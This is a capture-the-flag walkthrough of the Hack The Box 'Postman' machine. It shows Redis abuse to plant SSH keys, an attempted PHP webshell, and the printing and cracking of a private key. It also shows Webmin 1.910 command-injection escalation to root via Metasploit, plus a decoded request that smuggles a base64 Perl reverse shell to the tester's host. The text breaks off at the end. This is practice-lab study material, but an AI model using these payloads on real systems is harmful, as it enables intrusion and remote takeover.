@@ -1,0 +1,802 @@
+Postman - Hack The Box - 
+
+
+Ports open: 22, 80, 10000
+
+Look at source code and check for type of file index is: example
+index.php , index.html
+
+We turn on burp to further analyze web page http://10.10.10.160
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/postman]
+└──╼ $gobuster dir -u http://10.10.10.160/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o root.log
+====================================================================================================================================
+
+We check port 10000 while the gobuster is going.
+http://10.10.10.160:10000/
+
+And we get a hostname leak which we apepend to hour hosts file.
+Commands and Output:
+====================================================================================================================================
+Error - Document follows
+
+This web server is running in SSL mode. Try the URL https://Postman:10000/ instead.
+====================================================================================================================================
+
+Once we add the hostname file and go to the servers https website we are promoted for a username and password
+Commands and Output:
+====================================================================================================================================
+ Webmin
+
+You must enter a username and password to login to the server on postman
+====================================================================================================================================
+
+If we go back to back to the gobuster results there appears to be a /uploads directory we may be able to abuse maybe
+http://10.10.10.160/upload/
+
+Based on our full port scan we find that there is also a port 6370 open leading to a redis server on the foreign machine.
+We can try connecting via netcat
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/postman]
+└──╼ $nc 10.10.10.160 6379
+help
+-ERR unknown command 'help'
+?
+-ERR unknown command '?'
+client info
+-ERR Syntax error, try CLIENT (LIST | KILL | GETNAME | SETNAME | PAUSE | REPLY)
+info
+$2726
+# Server
+redis_version:4.0.9
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:9435c3c2879311f3
+redis_mode:standalone
+os:Linux 4.15.0-58-generic x86_64
+arch_bits:64
+multiplexing_api:epoll
+atomicvar_api:atomic-builtin
+gcc_version:7.4.0
+process_id:655
+run_id:b3fb83dd5e7ef85a6365ef93e8f6123eed74cd8e
+tcp_port:6379
+uptime_in_seconds:19660
+uptime_in_days:0
+hz:10
+lru_clock:10164811
+executable:/usr/bin/redis-server
+config_file:/etc/redis/redis.conf
+
+# Clients
+connected_clients:1
+client_longest_output_list:0
+client_biggest_input_buf:0
+blocked_clients:0
+
+# Memory
+used_memory:841240
+used_memory_human:821.52K
+used_memory_rss:3833856
+used_memory_rss_human:3.66M
+used_memory_peak:841240
+used_memory_peak_human:821.52K
+used_memory_peak_perc:100.12%
+used_memory_overhead:832086
+used_memory_startup:782456
+used_memory_dataset:9154
+used_memory_dataset_perc:15.57%
+total_system_memory:941203456
+total_system_memory_human:897.60M
+used_memory_lua:37888
+used_memory_lua_human:37.00K
+maxmemory:0
+maxmemory_human:0B
+maxmemory_policy:noeviction
+mem_fragmentation_ratio:4.56
+mem_allocator:jemalloc-3.6.0
+active_defrag_running:0
+lazyfree_pending_objects:0
+
+# Persistence
+loading:0
+rdb_changes_since_last_save:0
+rdb_bgsave_in_progress:0
+rdb_last_save_time:1620757887
+rdb_last_bgsave_status:ok
+rdb_last_bgsave_time_sec:-1
+rdb_current_bgsave_time_sec:-1
+rdb_last_cow_size:0
+aof_enabled:0
+aof_rewrite_in_progress:0
+aof_rewrite_scheduled:0
+aof_last_rewrite_time_sec:-1
+aof_current_rewrite_time_sec:-1
+aof_last_bgrewrite_status:ok
+aof_last_write_status:ok
+aof_last_cow_size:0
+
+# Stats
+total_connections_received:1
+total_commands_processed:1
+instantaneous_ops_per_sec:0
+total_net_input_bytes:24
+total_net_output_bytes:136
+instantaneous_input_kbps:0.00
+instantaneous_output_kbps:0.00
+rejected_connections:0
+sync_full:0
+sync_partial_ok:0
+sync_partial_err:0
+expired_keys:0
+expired_stale_perc:0.00
+expired_time_cap_reached_count:0
+evicted_keys:0
+keyspace_hits:0
+keyspace_misses:0
+pubsub_channels:0
+pubsub_patterns:0
+latest_fork_usec:0
+migrate_cached_sockets:0
+slave_expires_tracked_keys:0
+active_defrag_hits:0
+active_defrag_misses:0
+active_defrag_key_hits:0
+active_defrag_key_misses:0
+
+# Replication
+role:master
+connected_slaves:0
+master_replid:4eed5edb4f93951bd1343136255c3b9f7c298e0a
+master_replid2:0000000000000000000000000000000000000000
+master_repl_offset:0
+second_repl_offset:-1
+repl_backlog_active:0
+repl_backlog_size:1048576
+repl_backlog_first_byte_offset:0
+repl_backlog_histlen:0
+
+# CPU
+used_cpu_sys:15.50
+used_cpu_user:4.65
+used_cpu_sys_children:0.00
+used_cpu_user_children:0.00
+
+# Cluster
+cluster_enabled:0
+
+# Keyspace
+
+====================================================================================================================================
+
+Once we connect we can google redis commands online and see what data we can extract with the tool.
+
+We can query for genric informarion using INFO
+
+We see an interesting config file and its location on the local server of which we may be able to extract data.
+config_file:/etc/redis/redis.conf
+
+Seeing that we can query and get info there might be a way to upload and get a working webshell.
+GOOGLE: redis upload webshell
+
+Hacktrcks has good ways of extracting info from the redis server.
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/postman/nmap]
+└──╼ $sudo nmap --script redis-info -sV -p 6379  10.10.10.160 | tee redis.txt
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-11 17:02 PDT
+Nmap scan report for Postman (10.10.10.160)
+Host is up (0.091s latency).
+
+PORT     STATE SERVICE VERSION
+6379/tcp open  redis   Redis key-value store 4.0.9 (64 bits)
+|_redis-info: ERROR: Script execution failed (use -d to debug)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.46 seconds
+====================================================================================================================================
+
+We can also install the redis-cli tools set on the box
+Commands and Output:
+====================================================================================================================================
+sudo apt-get install redis-tools
+====================================================================================================================================
+
+Trying to configure the server to get a webshell appears to error out
+Commands and Output:
+====================================================================================================================================
+10.10.10.160:6379> config set dir /var/www/html/upload/
+OK
+10.10.10.160:6379> config set dbfilename redis.php
+OK
+10.10.10.160:6379> set test "<?php phpinfo(); ?>"
+OK
+10.10.10.160:6379> save
+(error) ERR
+====================================================================================================================================
+
+Will instead try generating and uploading ssh keys. But get the following error
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/postman/keys]
+└──╼ $cat postman.pub | redis-cli -h 10.10.10.160 -x set crackit
+(error) MISCONF Redis is configured to save RDB snapshots, but it is currently not able to persist on disk. Commands that may modify the data set are disabled, because this instance is configured to report errors during writes if RDB snapshotting fails (stop-writes-on-bgsave-error option). Please check the Redis logs for details about the RDB error.
+====================================================================================================================================
+
+Doing a quick google search we find that redis ssh is located in /var/lib/redis/.ssh
+Commands and Output:
+====================================================================================================================================
+10.10.10.160:6379> config set dir /var/lib/redis/.ssh
+OK
+10.10.10.160:6379> config set dbfilename "authorized_keys"
+OK
+10.10.10.160:6379> save
+..
+..
+..
+┌─[user@parrot-virtual]─[~/htb/postman/keys]
+└──╼ $ssh -i postman redis@10.10.10.160
+redis@10.10.10.160's password: 
+
+
+====================================================================================================================================
+
+Following all the steps and we stil could not get in.
+This time around we will issue the following command and repeat the same steps.
+Commands and Output:
+====================================================================================================================================
+ssh-keygen -t rsa -f postman
+┌─[✗]─[user@parrot-virtual]─[~/htb/postman/keys]
+└──╼ $cat postman.pub | redis-cli -h 10.10.10.160 -x set crackit
+OK
+
+..
+..
+..
+..
+┌─[user@parrot-virtual]─[~/htb/postman]
+└──╼ $redis-cli -h 10.10.10.160
+10.10.10.160:6379> config set dir /var/lib/redis/.ssh
+OK
+10.10.10.160:6379> config set dbfilename "authorized_keys"
+OK
+10.10.10.160:6379> save
+OK
+
+..
+..
+..
+┌─[✗]─[user@parrot-virtual]─[~/htb/postman/keys]
+└──╼ $ssh -i postman redis@10.10.10.160
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Wed May 12 01:29:25 2021 from 10.10.14.18
+redis@Postman:~$ whoami
+redis
+
+====================================================================================================================================
+
+This time we get in. Once in let's see what file we could write to
+Commands and Output:
+====================================================================================================================================
+redis@Postman:~$ find . -writable
+.
+./ibortfgq.so
+./.bash_history
+./.gnupg
+./.gnupg/private-keys-v1.d
+./.ssh
+./.ssh/authorized_keys
+./.ssh/redis.php
+./dkixshbr.so
+./.local
+./.local/share
+./.local/share/nano
+./vlpaulhk.so
+./.cache
+./.cache/motd.legal-displayed
+./module.o
+./qcbxxlig.so
+./dump.rdb
+====================================================================================================================================
+
+We can't write to /var/www/html/upload which explains why we could not have our upload script work.
+Commands and Output:
+====================================================================================================================================
+redis@Postman:~$ cd /home
+redis@Postman:/home$ ls
+Matt
+redis@Postman:/home$ cd Matt/
+redis@Postman:/home/Matt$ ls
+user.txt
+redis@Postman:/home/Matt$ ls -la 
+total 52
+drwxr-xr-x 6 Matt Matt 4096 Sep 11  2019 .
+drwxr-xr-x 3 root root 4096 Sep 11  2019 ..
+-rw------- 1 Matt Matt 1676 Sep 11  2019 .bash_history
+-rw-r--r-- 1 Matt Matt  220 Aug 25  2019 .bash_logout
+-rw-r--r-- 1 Matt Matt 3771 Aug 25  2019 .bashrc
+drwx------ 2 Matt Matt 4096 Aug 25  2019 .cache
+drwx------ 3 Matt Matt 4096 Aug 25  2019 .gnupg
+drwxrwxr-x 3 Matt Matt 4096 Aug 25  2019 .local
+-rw-r--r-- 1 Matt Matt  807 Aug 25  2019 .profile
+-rw-rw-r-- 1 Matt Matt   66 Aug 26  2019 .selected_editor
+drwx------ 2 Matt Matt 4096 Aug 26  2019 .ssh
+-rw-rw---- 1 Matt Matt   33 May 11 19:31 user.txt
+-rw-rw-r-- 1 Matt Matt  181 Aug 25  2019 .wget-hsts
+====================================================================================================================================
+
+Nothing to intersting most likely thing to do is is to get the matt user and from there escalate further, will use linpeas for 
+enumeration.
+
+Dont really find much will use linenum
+Interesting:
+===========================================================================
+Matt             pts/4    192.168.1.4      Mon Aug 26 00:04:37 +0100 2019
+===========================================================================
+
+We can also try finding files related to the webmin server and see what we can extract.
+Commands and Output:
+====================================================================================================================================
+redis@Postman:/dev/shm$ find / 2>/dev/null | grep -i webmin
+====================================================================================================================================
+
+After further combing through the LinEnum output we find and interesting readable file owned by the MATT user
+Commands and Output:
+====================================================================================================================================
+[-] Location and Permissions (if accessible) of .bak file(s):
+-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
+-rw------- 1 root root 695 Aug 25  2019 /var/backups/group.bak
+-rw------- 1 root shadow 577 Aug 25  2019 /var/backups/gshadow.bak
+-rw------- 1 root shadow 935 Aug 26  2019 /var/backups/shadow.bak
+-rw------- 1 root root 1382 Aug 25  2019 /var/backups/passwd.bak
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+redis@Postman:/opt$ ls -la
+total 12
+drwxr-xr-x  2 root root 4096 Sep 11  2019 .
+drwxr-xr-x 22 root root 4096 Sep 30  2020 ..
+-rwxr-xr-x  1 Matt Matt 1743 Aug 26  2019 id_rsa.bak
+redis@Postman:/opt$ cat id_rsa.bak 
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
+
+JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
+cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
+7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
+cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
+1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
+EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
+UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
+Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
+t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
+5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
+P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
+jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
+SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
+l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
+0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
+S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
+hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
+Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
+XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
+b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
+WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
+KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
+npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
+VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
+X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
+-----END RSA PRIVATE KEY-----
+====================================================================================================================================
+
+We can copy the encrypted rsa key and ssh2john to create a crackable version of the file to use with john the ripper.
+Commands and Output:
+====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/postman/keys]
+└──╼ $python2 /usr/share/john/ssh2john.py id_rsa.bak 
+id_rsa.bak:$sshng$0$8$73E9CEFBCCF5287C$1192$25e840e75235eebb0238e56ac96c7e0bcdfadc8381617435d43770fe9af72f6036343b41eedbec5cdcaa2838217d09d77301892540fd90a267889909cebbc5d567a9bcc3648fd648b5743360df306e396b92ed5b26ae719c95fd1146f923b936ec6b13c2c32f2b35e491f11941a5cafd3e74b3723809d71f6ebd5d5c8c9a6d72cba593a26442afaf8f8ac928e9e28bba71d9c25a1ce403f4f02695c6d5678e98cbed0995b51c206eb58b0d3fa0437fbf1b4069a6962aea4665df2c1f762614fdd6ef09cc7089d7364c1b9bda52dbe89f4aa03f1ef178850ee8b0054e8ceb37d306584a81109e73315aebb774c656472f132be55b092ced1fe08f11f25304fe6b92c21864a3543f392f162eb605b139429bb561816d4f328bb62c5e5282c301cf507ece7d0cf4dd55b2f8ad1a6bc42cf84cb0e97df06d69ee7b4de783fb0b26727bdbdcdbde4bb29bcafe854fbdbfa5584a3f909e35536230df9d3db68c90541d3576cab29e033e825dd153fb1221c44022bf49b56649324245a95220b3cae60ab7e312b705ad4add1527853535ad86df118f8e6ae49a3c17bee74a0b460dfce0683cf393681543f62e9fb2867aa709d2e4c8bc073ac185d3b4c0768371360f737074d02c2a015e4c5e6900936cca2f45b6b5d55892c2b0c4a0b01a65a5a5d91e3f6246969f4b5847ab31fa256e34d2394e660de3df310ddfc023ba30f062ab3aeb15c3cd26beff31c40409be6c7fe3ba8ca13725f9f45151364157552b7a042fa0f26817ff5b677fdd3eead7451decafb829ddfa8313017f7dc46bafaac7719e49b248864b30e532a1779d39022507d939fcf6a34679c54911b8ca789fef1590b9608b10fbdb25f3d4e62472fbe18de29776170c4b108e1647c57e57fd1534d83f80174ee9dc14918e10f7d1c8e3d2eb9690aa30a68a3463479b96099dee8d97d15216aec90f2b823b207e606e4af15466fff60fd6dae6b50b736772fdcc35c7f49e5235d7b052fd0c0db6e4e8cc6f294bd937962fab62be9fde66bf50bb149ca89996cf12a54f91b1aa2c2c6299ea9da821ef284529a5382b18d080aaede451864bb352e1fdcff981a36b505a1f2abd3a024848e0f3234ef73f3e2dda0dd7041630f695c11063232c423c7153277bbe671cb4b483f08c266fc547d89ff2b81551dabef03e6fd968a67502100111a7022ff3eb58a1fc065692d50b40eb379f155d37c1d97f6c2f5a01de13b8989174677c89d8a644758c071aea8d4c56a0374801732348db0b3164dcc82b6eaf3eb3836fa05cf5476258266a30a531e1a3132e11b944e8e0406cad59ffeaecc1ab3b7705db99353c458dc9932a638598b195e25a14051e414e20dc1510eb476a467f4e861a51036d453ea96721e0be34f4993a34b778d4111b29a63d69c1b8200869a129392684af8c4daa32f3d0a0d17c36275f039b4a3bf29e9436b912b9ed42b168c47c4205dcd00c114da8f8d82af761e69e900545eb6fc10ef1ba4934adb6fa9af17c812a8b420ed6a5b645cad812d394e93d93ccd21f2d444f1845d261796ad055c372647f0e1d8a844b8836505eb62a9b6da92c0b8a2178bad1eafbf87
+====================================================================================================================================
+
+We can now use john to crack this.
+Commands and Output:
+====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/postman/keys]
+└──╼ $sudo !!
+sudo john --wordlist=/opt/SecLists/rockyou.txt id_rsa.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
+Cost 2 (iteration count) is 2 for all loaded hashes
+Will run 4 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+computer2008     (id_rsa.bak)
+Warning: Only 1 candidate left, minimum 4 needed for performance.
+1g 0:00:00:06 DONE (2021-05-11 17:58) 0.1512g/s 2169Kp/s 2169Kc/s 2169KC/s *7¡Vamos!
+Session completed
+====================================================================================================================================
+
+The passphrase is computer2008
+
+Intersting thing is we could have done some forensics by looking at the time the MATT user logged into to see what files where 
+modified which would have helped us better locate the rsa file from before.
+Matt             pts/4    192.168.1.4      Mon Aug 26 00:04:37 +0100 2019
+Commands and Output:
+====================================================================================================================================
+redis@Postman:~$ find / -newermt 2019-08-26 ! -newermt 2019-09-26 2>/dev/null
+/opt
+/opt/id_rsa.bak
+/home
+/home/Matt
+/home/Matt/.bash_history
+/home/Matt/.ssh
+/home/Matt/.selected_editor
+/etc/shadow
+/etc/ssh
+/etc/ssh/sshd_config
+/etc/webmin
+/etc/webmin/webmin.acl
+/etc/webmin/config
+/etc/webmin/miniserv.conf
+/etc/webmin/Matt.acl
+/etc/webmin/miniserv.users
+/var/log/journal/2cb57e052840450f9a54b149b131d24d/system@0005924475c9fb9b-0e787e1275733a5c.journal~
+/var/log/journal/2cb57e052840450f9a54b149b131d24d/user-1000.journal
+/var/log/journal/2cb57e052840450f9a54b149b131d24d/system@000590f9eaeb1814-b231e22a0302f27e.journal~
+/var/lib/redis/dkixshbr.so
+/var/lib/redis/.local
+/var/lib/redis/.local/share
+/var/lib/redis/.local/share/nano
+/var/lib/dpkg/lock-frontend
+/var/www/html
+/var/www/html/upload
+/var/backups/shadow.bak
+/var/backups/dpkg.status.0
+====================================================================================================================================
+
+And we should be able to login as the MATT user, we should be able to login but can't despite our efforts.
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/postman/keys]
+└──╼ $ssh -i id_rsa.bak matt@10.10.10.160
+Enter passphrase for key 'id_rsa.bak': 
+Connection closed by 10.10.10.160 port 22
+====================================================================================================================================
+
+Let's try with no profile
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/postman/keys]
+└──╼ $ssh -t -i id_rsa.bak matt@10.10.10.160 bash --noprofile
+Enter passphrase for key 'id_rsa.bak': 
+Connection closed by 10.10.10.160 port 22
+====================================================================================================================================
+
+So we can't ssh so how about entering the pasphrase as the password for the Matt user while connected as redis.
+Commands and Output:
+====================================================================================================================================
+redis@Postman:~$ su - Matt
+Password: 
+Matt@Postman:~$ 
+====================================================================================================================================
+
+We could not login since the Matt user was blocked in the sshd_config file
+Commands and Output:
+====================================================================================================================================
+
+#deny users
+DenyUsers Matt
+
+====================================================================================================================================
+
+We can also try logging in with the Matt user on the webmin page. We use the same creds and we login, if we view the source code
+we can find the webmin version that is currently being used.
+Commands and Output:
+====================================================================================================================================
+<html data-host="postman:10000" data-hostname="Postman." data-title-initial="Webmin 1.910 (Ubuntu Linux 18.04.3)"
+====================================================================================================================================
+
+We can use this to search for exploits.
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/postman]
+└──╼ $searchsploit webmin
+-------------------------------------------------------------------------------------------------------- -----------------
+ Exploit Title                                                                                          |  Path
+-------------------------------------------------------------------------------------------------------- -----------------
+DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                                         | cgi/webapps/23535.txt
+phpMyWebmin 1.0 - 'target' Remote File Inclusion                                                        | php/webapps/2462.txt
+phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                                    | php/webapps/2451.txt
+Webmin - Brute Force / Command Execution                                                                | multiple/remote/705.pl
+webmin 0.91 - Directory Traversal                                                                       | cgi/remote/21183.txt
+Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                                             | linux/remote/22275.pl
+Webmin 0.x - 'RPC' Privilege Escalation                                                                 | linux/remote/21765.pl
+Webmin 0.x - Code Input Validation                                                                      | linux/local/21348.txt
+Webmin 1.5 - Brute Force / Command Execution                                                            | multiple/remote/746.pl
+Webmin 1.5 - Web Brute Force (CGI)                                                                      | multiple/remote/745.pl
+Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                   | unix/remote/21851.rb
+Webmin 1.850 - Multiple Vulnerabilities                                                                 | cgi/webapps/42989.txt
+Webmin 1.900 - Remote Command Execution (Metasploit)                                                    | cgi/remote/46201.rb
+Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                  | linux/remote/46984.rb
+Webmin 1.920 - Remote Code Execution                                                                    | linux/webapps/47293.sh
+Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                       | linux/remote/47230.rb
+Webmin 1.962 - 'Package Updates' Escape Bypass RCE (Metasploit)                                         | linux/webapps/49318.rb
+Webmin 1.x - HTML Email Command Execution                                                               | cgi/webapps/24574.txt
+Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                            | multiple/remote/1997.php
+Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                            | multiple/remote/2017.pl
+Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                           | linux/webapps/47330.rb
+-------------------------------------------------------------------------------------------------------- ------------------------
+Shellcodes: No Results
+====================================================================================================================================
+
+The one that sticks out is the webmin 1.91. Package Updates RCE
+Commands and Output:
+====================================================================================================================================
+Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                  | linux/remote/46984.rb
+====================================================================================================================================
+
+We can quikly run this metasploit module to see if we can get a shell.
+Commands and Output:
+====================================================================================================================================
+msf6 exploit(linux/http/webmin_packageup_rce) > set Password computer2008
+Password => computer2008
+msf6 exploit(linux/http/webmin_packageup_rce) > set rhosts 10.10.10.160
+rhosts => 10.10.10.160
+msf6 exploit(linux/http/webmin_packageup_rce) > set lhost tun0
+lhost => 10.10.14.18
+
+msf6 exploit(linux/http/webmin_packageup_rce) > set username Matt
+username => Matt
+msf6 exploit(linux/http/webmin_packageup_rce) > options
+
+Module options (exploit/linux/http/webmin_packageup_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD   computer2008     yes       Webmin Password
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.10.160     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      10000            yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base path for Webmin application
+   USERNAME   Matt             yes       Webmin Username
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.18      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Webmin <= 1.910
+
+
+msf6 exploit(linux/http/webmin_packageup_rce) > set ssl true
+[!] Changing the SSL option's value may require changing RPORT!
+ssl => true
+msf6 exploit(linux/http/webmin_packageup_rce) > run
+
+[*] Started reverse TCP handler on 10.10.14.18:4444 
+[+] Session cookie: eac45aad32427d0d1b0da4fbf8d3f443
+[*] Attempting to execute the payload...
+[*] Command shell session 1 opened (10.10.14.18:4444 -> 10.10.10.160:44048) at 2021-05-11 18:24:34 -0700
+
+whoami
+root
+pwd
+/usr/share/webmin/package-updates
+ls -la /root
+total 76
+drwx------  8 root root  4096 Sep 29  2020 .
+drwxr-xr-x 22 root root  4096 Sep 30  2020 ..
+-rw-------  1 root root 14541 May 12 02:27 .bash_history
+-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
+drwx------  2 root root  4096 Aug 24  2019 .cache
+drwx------  3 root root  4096 Aug 26  2019 .gnupg
+-rw-------  1 root root    28 Oct 25  2019 .lesshst
+drwxr-xr-x  3 root root  4096 Aug 24  2019 .local
+-rw-r--r--  1 root root   148 Aug 17  2015 .profile
+-rw-------  1 root root    79 Aug 25  2019 .rediscli_history
+-rw-r--r--  1 root root    66 Oct 25  2019 .selected_editor
+drwx------  2 root root  4096 Aug 25  2019 .ssh
+drwxr-xr-x  2 root root  4096 Aug 25  2019 .tmp
+-rw-------  1 root root  2105 Sep 29  2020 .viminfo
+drwxrwxr-x  6 root root  4096 Oct  2  2019 redis-5.0.0
+-rw-r--r--  1 root root    33 May 11 19:31 root.txt
+
+====================================================================================================================================
+
+Now that was doing it with metasploit so let's observe and see how we can do this manually.
+Commands and Output:
+====================================================================================================================================
+msf6 exploit(linux/http/webmin_packageup_rce) > set Proxies http:127.0.0.1:8080
+Proxies => http:127.0.0.1:8080
+msf6 exploit(linux/http/webmin_packageup_rce) > run
+
+[-] Exploit failed: RuntimeError TCP connect-back payloads cannot be used with Proxies. Use 'set ReverseAllowProxy true' to override this behaviour.
+[*] Exploit completed, but no session was created.
+msf6 exploit(linux/http/webmin_packageup_rce) > set ReverseAllowProxy true
+ReverseAllowProxy => true
+
+====================================================================================================================================
+
+
+Commands and Output:
+====================================================================================================================================
+POST /session_login.cgi HTTP/1.1
+Host: 10.10.10.160:10000
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Cookie: testing=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 33
+Connection: close
+
+page=&user=Matt&pass=computer2008
+====================================================================================================================================
+
+From burp Do intercept reponses to this request
+Use decoder
+Commands and Output:
+====================================================================================================================================
+u=acl%2Fapt&u=%20%7C%20bash%20-c%20%22%7becho%2ccGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4xODo0NDQ0Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0%2bZmRvcGVuKCRjLHcpO3doaWxlKDw%2bKXtpZigkXz1%2bIC8oLiopLyl7c3lzdGVtICQxO319Oyc%3d%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%22&ok_top=Update+Selected+Packages
+
+..
+..
+..
+SMART DECODE on BURP
+u=acl/apt&u= | bash -c "{echo,cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4xODo0NDQ0Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3doaWxlKDw+KXtpZigkXz1+IC8oLiopLyl7c3lzdGVtICQxO319Oyc=}|{base64,-d}|{bash,-i}"&ok_top=Update+Selected+Packages
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+u=acl/apt
+
